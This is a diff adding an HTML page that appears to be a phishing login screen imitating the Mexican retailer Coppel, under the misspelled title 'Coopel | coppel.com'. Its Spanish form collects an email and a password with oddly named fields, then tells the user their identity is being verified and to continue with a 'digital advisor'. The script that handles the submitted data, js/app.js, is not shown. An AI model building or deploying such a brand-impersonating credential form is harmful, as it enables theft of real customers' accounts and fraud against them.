@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="preconnect" href="https://fonts.googleapis.com/">
+	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&amp;display=swap" rel="stylesheet">  
+	<link rel="stylesheet" href="css/estilos.css">
+	<title>Coopel | coppel.com</title>
+	<link rel="shortcut icon" href="img/favicon.png">
+</head>
+<body>
+	<div class="contenedor">
+		<div class="columna-izquierda">
+			
+			<div class="registro activo" id="registro">
+				<div class="header">
+					<div class="logo"></div>
+					
+					<p>Inicia sesión con tu correo
+						electrónico</p>
+				</div>
+		
+				<form class="formulario" id="formulario">
+					<label for="nombre">Correo Electronico</label>
+					<div class="contenedor-input">
+						<img src="img/avatar.png" width="16" height="16" fill="currentColor" class="person-circle">
+
+						<input type="email" id="nombre" name="nombre" placeholder="Correo-electronico">
+					</div>
+		
+					<label for="correo">Contraseña</label>
+					<div class="contenedor-input ">
+						<img src="img/password.png" width="16" height="16" fill="currentColor" class="password">
+					
+						<input type="password" id="correo" name="correo" placeholder="Contraseña">
+					</div>
+					
+					<label for="telefono">Confirmar contraseña</label>
+					<div class="contenedor-input">
+						<img src="img/password.png" width="16" height="16" fill="currentColor" class="password2">
+	
+						<input type="password" id="telefono" name="telefono" placeholder="Confirmar contraseña">
+					</div>
+		
+					<div class="contenedor-boton">
+						<button type="submit">
+							Iniciar sesión
+				
+						</button>
+					</div>
+				</form>
+			</div>
+
+			<div class="header exito" id="exito">
+				<img src="img/logo.png" width="135" height="40">
+				<h1>Estamos verificando tu identidad</h1>
+				<p>Continua con tu asesor digital.</p>
+			</div>
+		</div>
+
+		<div class="columna-derecha">
+
+		</div>
+	</div>
+
+	<script src="js/app.js"></script>
+</body>
+</html>
